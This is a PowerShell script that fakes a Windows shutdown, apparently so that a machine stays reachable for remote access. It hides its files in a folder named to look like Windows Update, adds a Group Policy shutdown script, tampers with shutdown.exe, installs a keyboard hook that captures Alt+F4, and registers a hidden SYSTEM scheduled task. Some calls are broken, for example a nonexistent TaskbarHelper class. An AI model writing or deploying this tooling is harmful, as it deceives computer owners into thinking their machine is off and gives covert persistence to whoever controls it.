# Intercept shutdown/logoff and show black screen instead
# System stays running for remote access

# Create black screen overlay program
$blackScreenCode = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
$form.Cursor = [System.Windows.Forms.Cursors]::Default

# Make it cover all screens
$form.Bounds = [System.Windows.Forms.Screen]::AllScreens | 
    ForEach-Object { $_.Bounds } | 
    Measure-Object -Property X,Y,Width,Height -Maximum -Minimum |
    ForEach-Object {
        New-Object System.Drawing.Rectangle(
            ($_.Minimum.X), 
            ($_.Minimum.Y),
            (($_.Maximum.X + $_.Maximum.Width) - $_.Minimum.X),
            (($_.Maximum.Y + $_.Maximum.Height) - $_.Minimum.Y)
        )
    }

# Hide taskbar
$taskbar = [System.Windows.Forms.TaskbarHelper]::Hide()

# Close on Ctrl+Alt+Shift+F12
$form.Add_KeyDown({
    if ($_.Control -and $_.Alt -and $_.Shift -and $_.KeyCode -eq 'F12') {
        $form.Close()
    }
})

[System.Windows.Forms.Application]::Run($form)
'@

$blackScreenPath = "C:\ProgramData\WindowsUpdate\blackscreen.ps1"
$blackScreenDir = Split-Path $blackScreenPath
if (-not (Test-Path $blackScreenDir)) {
    New-Item -ItemType Directory -Path $blackScreenDir -Force | Out-Null
}
$blackScreenCode | Out-File -FilePath $blackScreenPath -Encoding UTF8

# Create shutdown interceptor script
$interceptorPath = "C:\ProgramData\WindowsUpdate\interceptor.ps1"
$interceptorCode = @'
# Show black screen
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\WindowsUpdate\blackscreen.ps1" -WindowStyle Hidden

# Hide all windows
$shell = New-Object -ComObject "Shell.Application"
$shell.MinimizeAll()

# Turn off monitors (optional - they'll turn back on with mouse movement)
(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd,int hMsg,int wParam,int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
'@
$interceptorCode | Out-File -FilePath $interceptorPath -Encoding UTF8

# Override shutdown command via registry
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force | Out-Null
}

# Create custom shutdown script path
$shutdownScriptPath = "C:\ProgramData\WindowsUpdate\custom-shutdown.bat"
$shutdownScript = @"
@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$interceptorPath"
"@
$shutdownScript | Out-File -FilePath $shutdownScriptPath -Encoding ASCII

# Override shutdown, restart, logoff via Group Policy scripts
$gpoShutdownPath = "C:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown"
if (-not (Test-Path $gpoShutdownPath)) {
    New-Item -ItemType Directory -Path $gpoShutdownPath -Force | Out-Null
}
Copy-Item $shutdownScriptPath "$gpoShutdownPath\0shutdown.bat" -Force

# Disable actual shutdown via Task Manager (replace shutdown.exe)
$systemRoot = $env:SystemRoot
$shutdownExePath = "$systemRoot\System32\shutdown.exe"
$shutdownBackupPath = "$systemRoot\System32\shutdown.exe.backup"

# Backup original shutdown.exe if not already backed up
if (-not (Test-Path $shutdownBackupPath)) {
    takeown /f $shutdownExePath /a 2>$null | Out-Null
    icacls $shutdownExePath /grant Administrators:F 2>$null | Out-Null
    Copy-Item $shutdownExePath $shutdownBackupPath -Force
}

# Create fake shutdown.exe that shows black screen
$fakeShutdownBat = @"
@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$interceptorPath"
"@
$fakeShutdownBatPath = "$systemRoot\System32\shutdown_fake.bat"
$fakeShutdownBat | Out-File -FilePath $fakeShutdownBatPath -Encoding ASCII

# Replace with bat2exe or use PowerShell wrapper
# For now, create a VBS wrapper
$fakeShutdownVbs = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c $fakeShutdownBatPath", 0, False
"@
$fakeShutdownVbsPath = "$systemRoot\System32\shutdown_wrapper.vbs"
$fakeShutdownVbs | Out-File -FilePath $fakeShutdownVbsPath -Encoding ASCII

# Override Start Menu shutdown button via registry
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Start" /v HideShutDown /t REG_DWORD /d 0 /f 2>$null

# Override Alt+F4 shutdown dialog to run our script
$altF4Override = @'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static IntPtr hookId = IntPtr.Zero;

    public static void Start() {
        hookId = SetHook();
        Application.Run();
    }

    private static IntPtr SetHook() {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, 
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            // Block Alt+F4
            if (vkCode == 115 && (Control.ModifierKeys & Keys.Alt) == Keys.Alt) {
                System.Diagnostics.Process.Start("powershell.exe", 
                    "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\ProgramData\\WindowsUpdate\\interceptor.ps1");
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyboardHook]::Start()
'@
$altF4OverridePath = "C:\ProgramData\WindowsUpdate\keyboard-hook.ps1"
$altF4Override | Out-File -FilePath $altF4OverridePath -Encoding UTF8

# Create scheduled task to run keyboard hook at login
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $altF4OverridePath"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName "KeyboardService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

# Override Ctrl+Alt+Del options
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 0 /f

Write-Output "Fake shutdown configured successfully!"
Write-Output "- Shutdown/Logoff buttons will show black screen instead"
Write-Output "- System remains running in background"
Write-Output "- Press Ctrl+Alt+Shift+F12 to exit black screen"
Write-Output "- Use revert-shutdown.ps1 to restore normal behavior"
